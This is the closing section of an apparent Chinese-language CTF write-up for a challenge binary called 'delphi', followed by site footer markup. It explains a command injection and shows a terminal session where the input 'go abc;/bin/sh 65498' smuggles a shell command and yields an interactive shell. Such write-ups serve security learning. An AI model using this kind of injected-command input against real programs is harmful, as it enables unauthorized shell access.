+<h3 id="command-injection">command injection</h3>
+<p>前面有看到組合的 'echo abc' ，此時可以利用 <code>;</code> 來進行 command injection 來拿到 shell</p>
+<div class="highlight"><pre><span></span>$ <span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span>. ./delphi 
+Welcome!
+
+Are you ready to play <span class="m">20</span> questions? No? Perfect!
+I<span class="err">&#39;</span>m thinking of something big, metal, and orange. Go!
+&gt; go abc<span class="p">;</span>/bin/sh <span class="m">65498</span>              <span class="c1"># 2^16 - 42 + 4 (eax = 4)</span>
+abc
+$ ls
+delphi  libtwenty.so  peda-session-delphi.txt
+$ 
+</pre></div>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../../../2014/NoConName_qual/inBINcible/" title="inBINcible" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                inBINcible
+              </span>
+            </div>
+          </a>
+        
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        powered by
+        <a href="http://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+        
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../../assets/javascripts/application.b438e6c5.js"></script>
+      
+      <script>app.initialize({version:"0.17.3",url:{base:"../../../.."}})</script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+      
+    
+    
+      
+    
+  </body>
+</html>
